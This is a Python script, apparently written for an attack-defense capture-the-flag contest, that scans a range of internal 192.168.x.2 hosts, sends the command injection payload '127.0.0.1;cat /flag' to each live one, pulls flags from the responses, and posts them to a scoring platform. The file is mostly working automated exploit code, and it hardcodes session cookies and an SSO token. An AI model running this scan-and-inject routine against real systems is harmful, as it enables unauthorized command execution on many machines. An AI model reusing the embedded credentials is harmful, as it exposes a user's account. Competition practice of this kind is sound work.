import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 精确屏蔽 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 配置参数
IP_RANGE = range(170, 252)
PORTS = [80]  # 可扩展常见Web端口
TIMEOUT = 3
THREADS = 20
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
QUESTION_ID = "90122"


def process_host():
    """并发探活，返回可达IP列表"""
    live_ips = []
    base_ips = [f"192.168.{i}.2" for i in IP_RANGE]

    def check_ip(ip):
        for port in PORTS:
            try:
                r = requests.get(f"http://{ip}:{port}", timeout=TIMEOUT)
                if 200 <= r.status_code < 500:  # 视为存活
                    logging.info(f"{ip}:{port} alive")
                    return ip  # 只要有一个端口成功即认为存活
            except:
                continue
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_ip, ip): ip for ip in base_ips}
        for future in as_completed(futures):
            result = future.result()
            if result:
                live_ips.append(result)

    # 写入文件（可选）
    with open("自动_ip.txt", "w", encoding="utf-8") as f:
        for ip in live_ips:
            f.write(ip + "\n")
    return live_ips


def get_flag(ip_list):
    """并发向每个IP发送命令注入请求，提取flag"""
    flag_dict = {}
    data = {"ip": "127.0.0.1;cat /flag"}  # 根据实际调整payload

    def attack(ip):
        url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
        try:
            r = requests.post(url, data=data, timeout=TIMEOUT)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{ip} found flag: {flag}")
                    return ip, flag
                else:
                    logging.warning(f"{ip} 200 but no flag")
                    return ip, None
            else:
                logging.warning(f"{ip} status {r.status_code}")
                return ip, None
        except Exception as e:
            logging.error(f"{ip} request failed: {e}")
            return ip, None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(attack, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, flag = future.result()  #不管成功，失败都写入文件
            flag_dict[ip] = flag

    # 写入结果文件
    with open("自动_flag.txt", "w", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            f.write(f"{ip}: {flag}\n")
    return flag_dict


def upload_flag(flag_dict):
    """上传所有获取到的flag到竞赛平台"""
    url = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
    headers = {
        "Host": "172.19.6.100",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
        "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://172.19.6.100",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://172.19.6.100/competition_web/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "um_auth=1; sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0xOFQyMTowNDozNy4wNDM0NzYyOTQrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODE3ODY4Nzd9.2P20iiNX9A7bTDaU1feQ2C7Cl-cND3pZbww9g8GchZA; competition_session=MTc4MTc4NzgwMnxOd3dBTkRjMU5GcE5WVmxYU3pORE4wY3lSa3RVTkVoYVJ6TkdWRmd5U0ZsSlRVNVlSRFZLU1VSS1NrOUNSMUZTTWxWR01sQkpTbEU9fGxfegurUX-usTdtd4GMFjfO8Uw5zY7ZPv33bKxYzckM",
    }
    # 忽略证书验证（内网自签名）
    session = requests.Session()
    session.verify = False
    with open("自动_upload_res.txt", "w", encoding="utf-8") as f:
        f.write("提交flag失败\n")
    with open("自动_upload_res.txt", "a", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            if flag:          #字典里面有flag的才需要上传
                payload = {"answer": flag}
                try:
                    resp = session.post(url, json=payload, headers=headers, timeout=5)
                    # 解析返回消息（假设返回json格式）
                    if resp.status_code == 200:
                        msg = resp.json().get("msg", "unknown")
                        logging.info(f"{ip} upload success: {msg}")
                    else:
                        msg = resp.json().get("msg", "unknown")
                        logging.error(f"{ip} upload failed, status {resp.status_code}, {msg}")
                        # 写入结果文件
                        f.write(f"{ip} upload failed, status {resp.status_code}  {msg} 写入失败，自行写入\n")
                except Exception as e:
                    logging.error(f"{ip} upload exception: {e}")
                    f.write(f"{ip} error, status {resp.status_code}  {msg} 写入失败，自行写入{flag}\n")
                sleep(20)
            else:
                pass


if __name__ == "__main__":
    live = process_host()
    flags = get_flag(live)
    if flags:    #字典不为空，上传
        upload_flag(flags)
    else:
        logging.warning("No flags found.")
